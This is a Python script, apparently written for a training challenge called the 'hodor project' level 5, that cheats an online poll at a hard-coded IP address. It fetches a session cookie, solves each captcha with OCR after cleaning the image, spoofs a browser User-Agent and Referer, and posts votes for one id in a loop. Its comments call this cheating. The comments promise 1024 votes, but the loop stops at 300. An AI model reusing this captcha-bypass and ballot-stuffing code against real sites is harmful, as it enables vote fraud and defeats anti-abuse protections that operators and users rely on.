##!/usr/bin/python3
"""Program to upload 1024 votes to level 5
of hodor project"""

import requests
import pytesseract
from PIL import Image, ImageEnhance, ImageFilter
from io import BytesIO
import time

# Open a session in the web page
session = requests.Session()

# Info needed for the cheat voting process
url = 'http://158.69.76.135/level5.php'
my_id = '2304'
url_captcha = 'http://158.69.76.135/tim.php'
windows_user = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) \
AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36")
headers = {"User-Agent": windows_user, "Referer": url}


# Loop to make the 1024 votes
print("Uploading votes...")
vote = 1
while vote <= 300:
    # Request by get method all the header info of the web page
    r = session.get(url)
    key = r.cookies['HoldTheDoor']
    cookie = {"HoldTheDoor": key}

    # Request by get method the captcha image
    r_img = session.get(url_captcha)

    # Use PIL module to get a better captcha image
    img = Image.open(BytesIO(r_img.content))
    img = img.convert('RGB')
    p1 = img.load()
    for x in range(img.size[0]):
        for y in range(img.size[1]):
            if ((p1[x, y][0] < 10) and (p1[x, y][1] < 10) and
                    (p1[x, y][2] < 10)):
                p1[x, y] = (0x80, 0x80, 0x80, 255)
    captcha = pytesseract.image_to_string(img).strip()

    # Request by post method to make the vote correctly
    try:
        params = {'id': my_id, 'holdthedoor': 'Submit', "key": key,
                  'captcha': captcha}
        response = session.post(url, data=params, cookies=cookie,
                                headers=headers, timeout=5)
        if response.status_code is 200 and len(response.text) > 100:
            print("Upload vote #{}".format(vote))
            vote += 1
    except Exception as error:
        print(error)
print("cheat online voting process ends :)")
